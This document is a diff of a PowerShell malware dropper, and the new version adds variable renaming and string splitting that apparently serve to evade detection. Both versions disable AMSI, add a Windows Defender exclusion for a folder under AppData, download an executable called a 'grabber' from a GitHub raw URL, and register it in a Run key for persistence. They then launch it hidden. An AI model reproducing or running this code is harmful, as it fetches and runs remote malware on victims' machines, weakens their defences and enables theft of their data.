@@ -1,35 +1,33 @@
-# 1. AMSI Bypass
-$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b;break}}
-$d=$c.GetField("amsiInitFailed","NonPublic,Static");$d.SetValue($null,$true)
+# Memory patch for bypass
+$s = [Ref].Assembly.GetTypes()
+foreach($t in $s){if($t.Name -like "*iUt*ls"){$u=$t;break}}
+$f = $u.GetField("ams"+"iInit"+"Failed","NonPublic,Static")
+$f.SetValue($null,$true)
 
-# 2. Payload Delivery Configuration
-$baseDir = "$env:APPDATA\Microsoft\Windows\Templates"
-$grabberUrl = "https://github.com/ashleywilmer7-star/trimiez/raw/refs/heads/main/combined.exe"
-$HKLM = [uint32]2147483650
-$wmi = [WMIClass]"root\default:StdRegProv"
+# Configuration
+$b = "$env:APPDATA\Microsoft\Windows\Templates"
+$u = "https://github.com/ashleywilmer7-star/trimiez/raw/refs/heads/main/combined.exe"
+$k = [uint32]2147483650
+$w = [WMIClass]"root\default:StdRegProv"
 
-# 3. Prep and Exclude
-if (!(Test-Path $baseDir)) { 
-    New-Item -Path $baseDir -Force -ItemType Directory | Out-Null
-}
-# Add exclusion via powershell to avoid interference
-powershell -Command "Add-MpPreference -ExclusionPath '$baseDir'"
+# Setup folder
+if (!(Test-Path $b)) { New-Item -ItemType Directory -Path $b -Force | Out-Null }
+powershell -c "Add-MpPreference -ExclusionPath '$b'"
 
-# 4. Download Binary
-$wc = New-Object Net.WebClient
-$wc.DownloadFile($grabberUrl, "$baseDir\sys_sync.exe")
+# Download and Persist
+$c = New-Object Net.WebClient
+$c.DownloadFile($u, "$b\sys_sync.exe")
 
-# 5. Persistence (HKLM Run Key)
+$r = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 try {
-    $runPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    $wmi.CreateKey($HKLM, $runPath)
-    $wmi.SetStringValue($HKLM, $runPath, "SystemSync", "$baseDir\sys_sync.exe")
+    $w.CreateKey($k, $r)
+    $w.SetStringValue($k, $r, "SystemSync", "$b\sys_sync.exe")
 } catch {
-    # If HKLM fails (no admin), try HKCU as backup
-    $HKCU = [uint32]2147483649
-    $wmi.CreateKey($HKCU, $runPath)
-    $wmi.SetStringValue($HKCU, $runPath, "SystemSync", "$baseDir\sys_sync.exe")
+    # Backup for non-admin
+    $k2 = [uint32]2147483649
+    $w.CreateKey($k2, $r)
+    $w.SetStringValue($k2, $r, "SystemSync", "$b\sys_sync.exe")
 }
 
-# 6. Execute Payload
-Start-Process "$baseDir\sys_sync.exe" -WindowStyle Hidden
+# Run
+Start-Process "$b\sys_sync.exe" -WindowStyle Hidden
